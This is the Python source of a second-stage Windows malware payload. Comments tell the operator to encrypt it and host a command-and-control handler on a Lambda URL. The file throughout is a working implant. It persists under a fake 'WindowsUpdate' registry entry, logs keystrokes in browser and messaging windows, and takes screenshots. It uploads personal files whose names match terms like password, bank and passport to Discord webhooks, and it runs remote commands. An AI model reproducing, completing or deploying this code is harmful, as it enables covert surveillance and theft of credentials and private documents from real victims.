# This is the plaintext second stage payload that will get executed by the first stage if decrypted sucessfully.
# This code must first be encrypted using the stage_2_encrypter.py file, once you have the cipher block ready, host it on your aws free tier
# lambda function url(soruce file: "index.mjs". This will be your C2 handler where you can issue commands and implement custom logic)
# Make sure that you remove all these comments before encrypting the payload as it may fail otherwise.
try:
    # null the memory objects from the first stage, not neccesary but may help in preventing memory scanning
    del ready_payload
    del decrypted_payload
    del elist
    del s2_payload
    # This variable will hold the discord webhooks received from your lambda url dynamically, this is done to prevent directly exposing them
    # statically
    eurls=None
    
    uflag=False
    dflag = False
    # Dynamically import the subprocess module
    subp_ = __import__("subprocess")
    
    # building path to ProgramData dir where additional files will be created for persistence and record keeping.
    base_path = os.getenv("PROGRAMDATA")
    fpath = os.path.join(base_path, "phold.txt")
    b_path = os.path.join(base_path, "btoken.txt")
    pp_ath = os.path.join(base_path, "flist.txt")
    if not os.path.isfile(fpath):
        r1 = "".join(chr((i*randint(1,13) % 26) + 65) if i % 2 else str((randint(10,23)) % randint(1,12)) for i in range(1,8)) + ".exe"
        rpath = os.path.join(base_path, r1)
        r = subp_.run(["powershell","-Command",f"Copy-Item -Path '{argv[0]}' -Destination '{rpath}' -Force"],capture_output=True, creationflags = subp_.CREATE_NO_WINDOW)
        if r.returncode == 0:
            l = subp_.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', 'WindowsUpdate', '/t', 'REG_SZ', '/d', f'{rpath}', '/f'], capture_output=True, creationflags = subp_.CREATE_NO_WINDOW)
            if l.returncode == 0:
                with open(fpath, "w") as t:
                    t.write("")
            else:
                if os.path.isfile(rpath):
                    os.remove(rpath)
                spath = os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", r1)
                ss = subp_.run(["powershell","-Command",f"Copy-Item -Path '{argv[0]}' -Destination '{spath}' -Force"],capture_output=True, creationflags = subp_.CREATE_NO_WINDOW)
                if ss.returncode != 0:
                    exit(0)
                else:
                    with open(fpath, "w") as t:
                        t.write("")
    cup = gprocaddr(d_handle, 3)
    cupt = CFUNCTYPE(c_int)(cup)
    mins = cupt()
    if mins <= 3:
        sleep(randint(60,140))
    Queue = getattr(__import__('queue'), 'Queue')
    mss = __import__("mss")
    keyboard = getattr(__import__('pynput'), 'keyboard')
    Thread = getattr(__import__('threading'), 'Thread')
    Event = getattr(__import__('threading'), "Event")
    post = getattr(__import__('requests'), 'post')
    io = __import__("io")
    k_que = Queue(maxsize=90)
    s_event = Event()
    block_routines = Event()
    jit = [110, 220]
    bot_id = ''
    if os.path.isfile(b_path):
        with open(b_path, "r") as k:
            bot_id = k.read().strip()
    else:
        bot_id = os.getlogin() + f"{randint(2,5)}{randint(5,9)}{randint(1,4)}{randint(3,9)}"
        with open(b_path, "w") as g:
            g.write(bot_id)
    curr_win = ''
    swin = ''
    cDate = gprocaddr(d_handle, 12)
    ccDate = CFUNCTYPE(c_char_p)(cDate)
    currDate = ccDate().decode("ascii")
    cWin = gprocaddr(d_handle, 13)
    ccwin = CFUNCTYPE(c_char_p)(cWin)
    def mon_thread():
        nproc = gprocaddr(d_handle, 1)
        nprocs = CFUNCTYPE(c_int)(nproc)
        while not s_event.is_set():
            res = nprocs()
            if res > 0:
                if not block_routines.is_set():
                    block_routines.set()
                sleep(randint(25,65))
            else:
                if block_routines.is_set():
                    block_routines.clear()
                sleep(randint(25,65))
    def c2Thread(listener):
        global bot_id
        global s_event
        global eurls
        global base_path
        global uflag
        global dflag
        c_count = 0
        tflag = False
        sleep(randint(3,6))
        head['val'] = "dynamic"
        while True:
            if tflag:
                break
            if c_count == 2:
                if listener:
                    listener.stop()
                break
            e_select = randint(0, len(eurls)-1)
            if block_routines.is_set():
                sleep(randint(jit[0], jit[1]))
            else:
                rec_data = get(surl, headers=head, timeout=(3,9))
                if rec_data.status_code == 200:
                    if rec_data.text.strip() == "":
                        sleep(randint(jit[0], jit[1]))
                    else:
                        try:
                            payload = ravenSlay(rec_data.text)
                            dpayload = ravenSong(payload, "d")
                            rbid = dpayload.strip().split("!")[0].split(",")
                            rcommand = dpayload.strip().split("!")[1]
                            if bot_id in rbid or "all" in rbid:
                                if rcommand == "terminate":
                                    s_event.set()
                                    if listener:
                                        listener.stop()
                                    tflag = True
                                elif rcommand == "uninstall":
                                    s_event.set()
                                    if listener:
                                        listener.stop()
                                    tflag = True
                                    uflag = True
                                elif rcommand == "down":
                                    tflag = True
                                    dflag = True
                                    s_event.set()
                                    if listener:
                                        listener.stop()
                                else:
                                    OOO__(dpayload.strip())
                            sleep(randint(jit[0], jit[1]))
                        except Exception as e:
                            post(eurls[e_select], json=({"content": f"Command Failure: {e}"}), headers=head)
                            sleep(randint(jit[0], jit[1]))
                elif rec_data.status_code == 404:
                    c_count += 1
                    sleep(randint(jit[0], jit[1]))
    def fstealer():
        global bot_id
        global s_event
        global eurls
        global pp_ath
        fail_count = 0
        home = os.path.expanduser("~")
        directories = [os.path.join(home, p) for p in ("Documents", "Downloads", "OneDrive", "Desktop")]
        keywords = [
        'password', 'passwords', 'bank', 'payroll',
        'resume', 'letter', 'record', 'records', 'cover', 'passport', 'social', 'credit', 'account',
        'invoice', 'tax', 'statement', 'payment', 'federal', 'transaction', 'cv', 'SIN', 'credentials', 'receipt', 'banking', "permit",
        ]
        e_list = ['bin', 'include', 'app', 'src', 'node_modules', 'venv', 'dist', 'site-packages', 'lib']
        if not os.path.exists(pp_ath):
            with open(pp_ath, 'w') as o:
                o.write('')
        with open(pp_ath, 'r') as o:
            path_set = set(o.read().splitlines())
        for directory in directories:
            if s_event.is_set():
                break
            if fail_count == 2:
                break
            if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        if s_event.is_set():
                            break
                        if fail_count == 2:
                            break
                        dirs[:] = [d for d in dirs if not any(part in e_list for part in os.path.join(root, d).split(os.path.sep))]
                        for filename in files:
                            if s_event.is_set():
                                break
                            if fail_count == 2:
                                break
                            if not os.path.join(root,filename) in path_set:
                                if any(keyword.lower() in filename.lower() for keyword in keywords):
                                    with open(os.path.join(root,filename), 'rb') as k:
                                            dat = k.read()
                                    ff = {"file": (f"{bot_id}_{currDate}_{os.path.basename(filename)}", dat)}
                                    e_select = randint(0, len(eurls)-1)
                                    if block_routines.is_set():
                                        sleep(randint(jit[0], jit[1]))
                                    else:
                                        res = post(eurls[e_select], files=ff, headers=head)
                                        if res.status_code == 200:
                                            with open(pp_ath, 'a') as d:
                                                d.write(f'{os.path.join(root,filename)}\n')
                                        elif res.status_code == 404:
                                            fail_count += 1
                                        sleep(randint(jit[0], jit[1]))
    def sloop():
        global bot_id
        global eurls
        global s_event
        global swin
        global ccwin
        e_count = 0
        with mss.mss() as sct:
            while True:
                if s_event.is_set():
                    break
                if e_count == 2:
                    break
                if block_routines.is_set():
                    sleep(randint(70,120))
                else:
                    try:
                        c_win = ccwin().decode("ascii") or "Unknown"
                        if swin != c_win:
                            swin = c_win
                            bb = ['chrome', 'firefox', 'edge', 'brave', 'whatsapp']
                            if any(b in c_win.lower() for b in bb):
                                screenshot = sct.grab(sct.monitors[0])
                                img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                                buf = io.BytesIO(img_bytes)
                                fff = {'file': (f'{bot_id}_{currDate}_ss.png', buf, 'image/png')}
                                e_select = randint(0, len(eurls)-1)
                                res = post(eurls[e_select], files=fff, headers=head)
                                if res.status_code == 200:
                                    sleep(randint(40,80))
                                elif res.status_code == 404:
                                    e_count += 1
                        else:
                            sleep(randint(50,100))
                    except Exception as e:
                        break
    def klogger(key):
        global curr_win
        global k_que
        global eurls
        global ccwin
        global bot_id
        new_win = ''
        if block_routines.is_set():
            print("")
        else:
            if k_que.full():
                try:
                    p_dat = ''
                    while not k_que.empty():
                        p_dat += k_que.get()
                    ff_dat = ravenSong(p_dat, "j")
                    file_obj = io.BytesIO(ff_dat.encode('utf-8'))
                    file_obj.name = f"{bot_id}_{currDate}_keys.txt"
                    ff = {"file": (file_obj.name, file_obj)}
                    e_select = randint(0, len(eurls)-1)
                    post(eurls[e_select], files=ff, headers=head)
                except Exception as w:
                    print("")
            else:
                new_win = ccwin().decode("ascii")
                if curr_win != new_win:
                    curr_win = new_win
                    k_que.put(f'[Window]: {curr_win}\n')
                if any(browser in curr_win.lower() for browser in ['chrome', 'edge', 'firefox', 'incognito', 'browser', 'email', 'whatsapp', 'instagram']):
                    try:
                        k_que.put(f'{key.char}\n')
                    except AttributeError:
                        k_que.put(f'{key}\n')
    head['val'] = "urls"
    lit = get(surl, headers=head, timeout=(2,6))
    if lit.status_code == 200:
        eurls = lit.text.split(",")
    else:
        exit(0)
    listener = keyboard.Listener(on_press=klogger)
    listener.start()
    threads = []
    try:
        mthread = Thread(target = mon_thread)
        mthread.start()
        threads.append(mthread)
    except Exception as r:
        print(r)
    sleep(randint(2,5))    
    try:
        greabber_thread = Thread(target = fstealer)
        greabber_thread.start()
        threads.append(greabber_thread)
    except Exception as l:
        print(l)
    sleep(randint(2,6))
    try:
        ss_thread = Thread(target = sloop)
        ss_thread.start()
        threads.append(ss_thread)
    except Exception as l:
        print(l)
    sleep(randint(2,5))
    try:
        c_thread = Thread(target = c2Thread, args=(listener,))
        c_thread.start()
    except Exception as r:
        pass
    listener.join()
    for t in threads:
        t.join()
    if uflag:
        if os.path.isfile(fpath):
            os.remove(fpath)
        if os.path.isfile(b_path):
            os.remove(b_path)
        if os.path.isfile(pp_ath):
            os.remove(pp_ath)
        if "Startup" in argv[0]:
            os.rename(f"{os.path.abspath(argv[0])}", os.path.join(os.path.expanduser("~"), "Downloads", os.path.basename(argv[0])))
        else:
            subp_.run(['reg','delete', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run','/v','WindowsUpdate','/f'],creationflags=subp_.CREATE_NO_WINDOW)
            subp_.Popen(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", f"Start-Sleep -Seconds 8 && Remove-Item -LiteralPath '{os.path.abspath(argv[0])}' -Force"], creationflags=subp_.CREATE_NO_WINDOW)
    if dflag:
        os.system("shutdown -s -t 1")
except Exception as k:
    print(k)
